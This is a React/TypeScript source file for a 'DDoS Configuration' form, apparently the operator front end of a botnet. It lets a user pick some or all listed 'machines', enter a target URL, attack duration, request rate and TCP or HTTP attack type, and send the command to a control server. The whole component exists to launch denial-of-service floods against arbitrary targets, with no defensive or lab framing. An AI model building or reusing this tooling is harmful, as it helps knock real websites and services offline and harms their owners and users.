import React, { useState } from "react";
import { useUserStore } from "@/Stores/UserStore";

type DdosConfig = {
    targetUrl: string;
    attackDuration: string;
    requestRate: string;
    attackType: "tcp" | "http";
};

export const DDOSForm: React.FC = () => {
    const { users } = useUserStore();
    const [selectedMachines, setSelectedMachines] = useState<string[]>([]);
    const [selectedMachine, setSelectedMachine] = useState<string>("");
    const [ddosConfig, setDdosConfig] = useState<DdosConfig>({
        targetUrl: "",
        attackDuration: "",
        requestRate: "",
        attackType: "tcp",
    });

    const handleAddMachine = () => {
        if (selectedMachine === "All") {
            setSelectedMachines(users.map((user) => user.machine_name));
        } else if (selectedMachine && !selectedMachines.includes(selectedMachine)) {
            setSelectedMachines((prev) => [...prev, selectedMachine]);
        }
        setSelectedMachine("");
    };

    const handleRemoveMachine = (machine: string) => {
        setSelectedMachines((prev) => prev.filter((m) => m !== machine));
    };

    const handleDdosConfigChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
        const { name, value } = e.target;
        setDdosConfig((prev) => ({ ...prev, [name]: value }));
    };

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();

        const data = {
            selectedMachines,
            ddosConfig,
        };

        try {
            const response = await fetch("http://localhost:8080", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify(data),
            });

            if (response.ok) {
                alert("Request sent successfully: " + response.statusText);
            } else {
                alert("Error sending request: " + response.statusText);
            }
        } catch (error) {
            alert("Error sending request: " + error);
        }
    };

    return (
        <div className="bg-gray-900 text-green-400 p-8 rounded-lg shadow-md max-w-5xl mx-auto">
            <h2 className="text-2xl font-bold text-center mb-6">💻 DDoS Configuration</h2>
            <form onSubmit={handleSubmit} className="flex flex-col gap-8">
                <div className="flex flex-col md:flex-row gap-8">
                    {/* Machine Selection */}
                    <div className="w-full md:w-1/2 space-y-6">
                        <h3 className="font-semibold text-lg">Select Machines</h3>
                        <div className="space-y-4">
                            <div className="flex items-center gap-4">
                                <select
                                    value={selectedMachine}
                                    onChange={(e) => setSelectedMachine(e.target.value)}
                                    className="w-full px-3 py-2 bg-gray-800 text-green-400 border border-green-500 rounded-md focus:ring-2 focus:ring-green-500"
                                >
                                    <option value="">Select a machine</option>
                                    <option value="All">All</option>
                                    {users.map((user, index) => (
                                        <option key={index} value={user.machine_name}>
                                            {user.machine_name}
                                        </option>
                                    ))}
                                </select>
                                <button
                                    type="button"
                                    onClick={handleAddMachine}
                                    className="bg-green-500 hover:bg-green-600 text-gray-900 font-bold py-2 px-4 rounded-md transition"
                                >
                                    Add
                                </button>
                            </div>
                            <div className="max-h-40 overflow-y-auto border border-green-500 rounded-md p-2">
                                {selectedMachines.length > 0 ? (
                                    selectedMachines.map((machine, index) => (
                                        <div
                                            key={index}
                                            className="flex items-center justify-between bg-gray-800 px-3 py-2 rounded-md mb-2"
                                        >
                                            <span>{machine}</span>
                                            <button
                                                type="button"
                                                onClick={() => handleRemoveMachine(machine)}
                                                className="text-red-500 hover:text-red-600"
                                            >
                                                Remove
                                            </button>
                                        </div>
                                    ))
                                ) : (
                                    <p className="text-sm text-gray-500">No machines selected.</p>
                                )}
                            </div>
                        </div>
                    </div>

                    {/* Advanced Configuration */}
                    <div className="w-full md:w-1/2 space-y-6">
                        <h3 className="font-semibold text-lg">Advanced Configuration</h3>
                        <div className="space-y-4">
                            <div>
                                <label className="block text-sm font-medium">Target URL</label>
                                <input
                                    type="url"
                                    name="targetUrl"
                                    value={ddosConfig.targetUrl}
                                    onChange={handleDdosConfigChange}
                                    placeholder="http://example.com"
                                    className="w-full px-3 py-2 bg-gray-800 text-green-400 border border-green-500 rounded-md focus:ring-2 focus:ring-green-500"
                                />
                            </div>
                            <div>
                                <label className="block text-sm font-medium">Attack Duration (seconds)</label>
                                <input
                                    type="number"
                                    name="attackDuration"
                                    value={ddosConfig.attackDuration}
                                    onChange={handleDdosConfigChange}
                                    placeholder="Duration in seconds"
                                    className="w-full px-3 py-2 bg-gray-800 text-green-400 border border-green-500 rounded-md focus:ring-2 focus:ring-green-500"
                                />
                            </div>
                            <div>
                                <label className="block text-sm font-medium">Request Rate (requests/second)</label>
                                <input
                                    type="number"
                                    name="requestRate"
                                    value={ddosConfig.requestRate}
                                    onChange={handleDdosConfigChange}
                                    placeholder="Requests per second"
                                    className="w-full px-3 py-2 bg-gray-800 text-green-400 border border-green-500 rounded-md focus:ring-2 focus:ring-green-500"
                                />
                            </div>
                            <div>
                                <label className="block text-sm font-medium">Attack Type</label>
                                <select
                                    name="attackType"
                                    value={ddosConfig.attackType}
                                    onChange={handleDdosConfigChange}
                                    className="w-full px-3 py-2 bg-gray-800 text-green-400 border border-green-500 rounded-md focus:ring-2 focus:ring-green-500"
                                >
                                    <option value="tcp">TCP</option>
                                    <option value="http">HTTP</option>
                                </select>
                            </div>
                        </div>
                    </div>
                </div>

                {/* Submit Button */}
                <div className="w-full">
                    <button
                        type="submit"
                        className="w-full bg-green-500 hover:bg-green-600 text-gray-900 font-bold py-2 px-4 rounded-md transition"
                    >
                        🚀 Submit
                    </button>
                </div>
            </form>
        </div>
    );
};

export default DDOSForm;
